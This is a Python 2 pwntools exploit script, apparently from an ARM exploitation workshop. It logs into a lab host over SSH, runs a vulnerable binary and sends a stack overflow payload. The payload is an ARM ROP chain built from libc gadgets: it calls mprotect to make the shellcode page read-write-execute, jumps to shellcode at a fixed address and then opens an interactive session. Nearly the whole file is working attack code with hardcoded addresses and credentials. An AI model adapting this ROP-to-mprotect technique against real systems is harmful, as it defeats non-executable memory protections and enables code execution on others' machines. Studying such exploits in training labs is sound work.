#!/usr/bin/env python2
 
from pwn import *
import time

ip = "192.168.1.100"
port = 22
user = "user1"
pwd = "pass1"

libc = ELF('/home/arm/Workshop/exploits/gadgets/libc-2.24.so')

libc_base = 0x76e65000

shell = ssh(user, ip, password=pwd, port=port)

sh = shell.run('/home/user1/Workshop/exploits/stack_mprotect/stack_mprotect')

time.sleep(2)

shellcode_address = 0x22008
page_size = 4096

shellcode_page_aligned = (shellcode_address & ~(page_size-1))

gadget1_offset = 0x00038a24            # pop {lr} ; add sp, sp, #4 ; bx lr
gadget2_offset = 0x000e6a68            # pop {r0, r1, r2, r6, pc}

gadget1_address = libc_base + gadget1_offset
gadget2_address = libc_base + gadget2_offset + 1 # thumb
mprotect_address = libc_base + libc.symbols['mprotect']
log.info('address of the gadget1: %#x' % gadget1_address)
log.info('address of the gadget2: %#x' % gadget2_address)
log.info('address of the mprotect: %#x' % mprotect_address)

payload = "A"*64                       # padding
payload += "B"*4                       # r11

payload += p32(gadget1_address)        # gadget1
payload += p32(gadget2_address)        # lr address

payload += p32(0x41414141)             # padding due to: add sp, sp, #4       
payload += p32(shellcode_page_aligned) # r0 = shellcode address page aligned 
payload += p32(0x100)                  # r1 = shellcode size
payload += p32(0x7)                    # r2 = protection 7 (rwx)
payload += p32(0x41414141)             # r6 = not important
payload += p32(mprotect_address)       # pc = mprotect address

payload += p32(0x41414141)             # r0 = not important
payload += p32(0x41414141)             # r1 = not important
payload += p32(0x41414141)             # r2 = not important
payload += p32(0x41414141)             # r6 = not important
payload += p32(shellcode_address)      # pc = shellcode address

sh.sendline(payload)
sh.interactive()
shell.close()
